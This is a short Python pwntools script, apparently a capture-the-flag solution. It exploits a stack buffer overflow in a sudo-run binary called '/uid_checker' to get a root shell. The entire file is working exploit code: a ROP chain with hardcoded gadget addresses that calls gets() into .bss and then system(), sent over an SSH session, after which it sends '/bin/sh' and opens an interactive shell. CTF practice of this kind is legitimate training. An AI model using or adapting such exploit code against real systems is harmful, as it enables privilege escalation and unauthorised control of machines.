from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88 # Found with ropstar

payload = cyclic(offset)
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x4005b0) # gets()
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x400570) # system()

s = ssh(host='<IP>', user='dave', keyfile='./example')

p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive(prompt='')

